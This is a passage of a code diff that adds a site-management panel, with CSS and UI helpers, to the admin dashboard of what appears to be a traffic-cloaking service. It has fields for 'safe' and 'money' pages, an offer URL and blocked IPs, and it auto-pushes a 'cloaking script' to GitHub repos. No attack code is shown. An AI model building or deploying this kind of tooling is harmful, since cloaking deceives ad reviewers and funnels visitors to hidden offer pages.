+      +       '<label>Permanently Blocked IPs (one per line)</label>'
+      +       '<textarea name="blockedIps" rows="3">' + escHtml((s.blockedIps || []).join('\n')) + '</textarea>'
+      +     '</div>'
+      +     '<button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save &amp; Push to GitHub</button>'
+      +   '</form>'
+      + '</div>'
+      + '</div>';
+  }).join('');
+
+  var sitesCardHtml = '<div class="card" style="margin-bottom:18px">'
+    + '<h2>Connected Sites (' + sites.length + ')</h2>'
+
+    + (!hasGithubToken ? '<div style="background:#2d0808;border:1px solid #7f1d1d;border-radius:8px;padding:12px;margin-bottom:14px;font-size:0.78rem;color:#fca5a5">'
+      + '<strong>GitHub token not configured.</strong> Auto-inject and auto-deploy are disabled. '
+      + 'Set the <code>GITHUB_TOKEN</code> secret (a GitHub Personal Access Token with <code>repo</code> scope) to enable them. '
+      + 'You can still add sites and use the manual script snippet.'
+      + '</div>' : '')
+
+    + siteRowsHtml
+
+    + '<div style="border-top:1px solid #1f1035;margin-top:14px;padding-top:14px">'
+    + '<p style="font-size:0.78rem;color:#a78bfa;font-weight:700;margin-bottom:10px">&#43; Add New Site</p>'
+    + '<form method="POST" action="/admin/sites">'
+    +   '<div class="form-grid2">'
+    +     '<div><label>Site Name *</label><input type="text" name="name" placeholder="My Peacock Site" required></div>'
+    +     '<div><label>Domain</label><input type="text" name="domain" placeholder="mypeacocksite.com"></div>'
+    +   '</div>'
+    +   '<div class="form-grid2" style="margin-top:10px">'
+    +     '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" placeholder="https://github.com/user/repo"></div>'
+    +     '<div><label>Money URL</label><input type="text" name="moneyUrl" placeholder="https://your-offer-page.com"></div>'
+    +   '</div>'
+    +   '<p class="hint" style="margin-top:8px">When you click Add Site: an API key is generated, safe &amp; money pages are created on this hub, and the cloaking script is automatically pushed to your GitHub repo (if token is set and repo is provided).</p>'
+    +   '<button type="submit" class="btn-primary" style="margin-top:12px">Add Site &rarr;</button>'
+    + '</form>'
+    + '</div>'
+    + '</div>';
 
   // ── Recent events for live feed (server-rendered initial state) ───────────
   function liveRow(l) {
@@ -964,6 +1560,48 @@ tr:hover td{background:rgba(124,58,237,0.07)}
 .pag-btn:hover{background:#2d1060}
 .pag-disabled{padding:6px 16px;border-radius:8px;background:#0d0018;border:1px solid #1f1035;color:#444;font-size:0.8rem;font-weight:600;cursor:default}
 .pag-info{font-size:0.78rem;color:#777}
+
+/* ── Site selector bar ── */
+.site-bar{background:#100820;border-bottom:1px solid #230e4a;padding:8px 28px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.site-bar label{font-size:0.75rem;color:#666;white-space:nowrap}
+.site-select{background:#0d0018;border:1px solid #3d1f6e;border-radius:8px;color:#c084fc;font-size:0.82rem;padding:5px 10px;outline:none;cursor:pointer}
+.site-select:focus{border-color:#a855f7}
+.site-filter-badge{display:inline-block;padding:3px 10px;background:#2d1060;border:1px solid #7c3aed;border-radius:20px;font-size:0.72rem;color:#c084fc;font-weight:600}
+.site-created-flash{padding:3px 12px;background:#14532d;border:1px solid #4ade80;border-radius:20px;font-size:0.72rem;color:#4ade80;font-weight:600}
+
+/* ── Sites management card ── */
+.site-row{background:#0d0018;border:1px solid #2e1655;border-radius:10px;padding:16px;margin-bottom:12px}
+.site-row:last-child{margin-bottom:0}
+.site-row-hdr{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
+.site-name{font-size:0.9rem;font-weight:700;color:#c084fc}
+.site-domain{font-size:0.75rem;color:#666}
+.deploy-badge{display:inline-block;padding:2px 9px;border-radius:12px;font-size:0.7rem;font-weight:700;text-transform:uppercase;letter-spacing:0.5px}
+.db-live{background:#14532d;color:#4ade80}
+.db-pushed{background:#1e3a5f;color:#60a5fa}
+.db-pending{background:#451a03;color:#fbbf24}
+.db-failed{background:#450a0a;color:#f87171}
+.db-rotated{background:#2d1060;color:#a78bfa}
+.site-key-wrap{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
+.site-key-val{font-family:'SF Mono',Menlo,monospace;font-size:0.72rem;color:#a78bfa;background:#160930;padding:5px 10px;border-radius:6px;border:1px solid #3d1f6e;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.copy-btn{padding:4px 10px;font-size:0.7rem;background:#1a0d2e;border:1px solid #7c3aed;border-radius:6px;color:#c084fc;cursor:pointer;white-space:nowrap;transition:background .2s}
+.copy-btn:hover{background:#2d1060}
+.site-urls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.site-url-chip{font-size:0.7rem;color:#888;background:#0d0010;border:1px solid #1f1035;border-radius:6px;padding:3px 8px;font-family:'SF Mono',Menlo,monospace}
+.site-url-chip a{color:#a78bfa;text-decoration:none}
+.site-url-chip a:hover{color:#c084fc}
+.snippet-wrap{margin-bottom:12px}
+.snippet-toggle{background:none;border:1px solid #2e1655;border-radius:6px;padding:4px 10px;color:#888;font-size:0.72rem;cursor:pointer;margin-bottom:6px;width:100%;text-align:left}
+.snippet-toggle:hover{border-color:#7c3aed;color:#c084fc}
+.snippet-box{display:none;background:#060010;border:1px solid #2e1655;border-radius:8px;padding:12px;font-family:'SF Mono',Menlo,monospace;font-size:0.68rem;color:#7dd3a8;line-height:1.5;overflow-x:auto;white-space:pre-wrap;word-break:break-all;position:relative}
+.snippet-box.open{display:block}
+.snippet-copy{position:absolute;top:8px;right:8px;padding:3px 8px;font-size:0.68rem;background:#1a0d2e;border:1px solid #3d1f6e;border-radius:5px;color:#c084fc;cursor:pointer}
+.site-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.site-details-toggle{background:none;border:1px solid #2e1655;border-radius:6px;padding:5px 12px;color:#888;font-size:0.74rem;cursor:pointer;transition:all .2s}
+.site-details-toggle:hover{border-color:#7c3aed;color:#c084fc}
+.site-settings-panel{display:none;margin-top:14px;border-top:1px solid #1f1035;padding-top:14px}
+.site-settings-panel.open{display:block}
+.form-grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:700px){.form-grid2{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
@@ -1007,7 +1645,12 @@ tr:hover td{background:rgba(124,58,237,0.07)}
   </div>
 </header>
 
+${siteBarHtml}
+
 <div class="container">
+
+  <!-- Sites Management Card -->
+  ${sitesCardHtml}
 
   <!-- Live Activity Panel -->
   <div class="live-card">
@@ -1427,6 +2070,39 @@ tr:hover td{background:rgba(124,58,237,0.07)}
   };
   es.onerror = function() {};
 })();
+
+// ── Sites helpers ─────────────────────────────────────────────────────────────
+function copyKey(elId, key, btn) {
+  navigator.clipboard.writeText(key).then(function() {
+    var orig = btn.textContent;
+    btn.textContent = 'Copied!'; btn.style.color = '#4ade80';
+    setTimeout(function() { btn.textContent = orig; btn.style.color = ''; }, 2000);
+  }).catch(function() { prompt('Copy API key:', key); });
+}
+function toggleSnippet(id, btn) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.classList.toggle('open');
+  btn.textContent = el.classList.contains('open')
+    ? '<\\/> Hide integration script'
+    : '<\\/> Show integration script — paste this in your site\\'s <head>';
+}
+function copySnippet(id, btn) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  var text = el.innerText.replace(/^Copy\\n?/, '').trim();
+  navigator.clipboard.writeText(text).then(function() {
+    var orig = btn.textContent;
+    btn.textContent = 'Copied!'; btn.style.color = '#4ade80';
+    setTimeout(function() { btn.textContent = orig; btn.style.color = ''; }, 2000);
+  }).catch(function() { prompt('Copy snippet:', text); });
+}
+function togglePanel(id, btn) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.classList.toggle('open');
+  btn.innerHTML = el.classList.contains('open') ? '&#9881; Hide Settings' : '&#9881; Settings';
+}
 </script>
 </body>
 </html>`;
